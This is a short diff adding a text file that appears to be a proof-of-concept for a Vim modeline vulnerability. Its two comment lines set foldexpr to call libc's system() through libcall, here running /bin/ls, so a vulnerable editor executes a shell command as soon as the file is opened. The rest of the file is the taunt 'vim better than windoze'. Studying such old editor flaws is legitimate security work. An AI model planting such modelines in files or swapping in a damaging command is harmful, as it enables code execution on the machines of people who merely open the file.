@@ -1,0 +1,8 @@
+------------------------
+/* vim:set foldmethod=expr: */
+/* vim:set foldexpr=confirm(libcall("/lib/libc.so.6","system","/bin/ls"),"ms_sux"): */
+
+vim better than windoze
+
+
+------------------------
